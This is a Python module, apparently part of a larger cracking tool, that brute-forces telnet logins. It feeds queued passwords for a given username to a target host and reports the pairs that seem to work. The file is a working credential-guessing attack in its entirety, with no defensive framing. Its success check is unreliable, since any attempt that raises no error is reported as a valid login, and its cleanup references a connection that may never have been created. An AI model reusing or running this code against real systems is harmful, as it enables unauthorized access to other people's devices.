'''
module : telnetlib


'''


import time
import telnetlib
import re

class telnetcrack:
    def __init__(self,op,args):
        self.op=op
        self.args=args


    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)



            try:
                tn = telnetlib.Telnet(self.op.host,port=self.op.port,timeout=1)
                tn.read_until("login:".encode())
                tn.write((username+'\r\n').encode())
                tn.read_until("Password:".encode())
                tn.write((passwd+"\r\n").encode())
                tn.read_some()
                tn.read_some()
                tn.read_some()
                tn.read_some()
                outputq.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            except Exception as e:
                if self.op.verbose!=None:
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd: %s" % (username, passwd))

            finally:
                tn.close()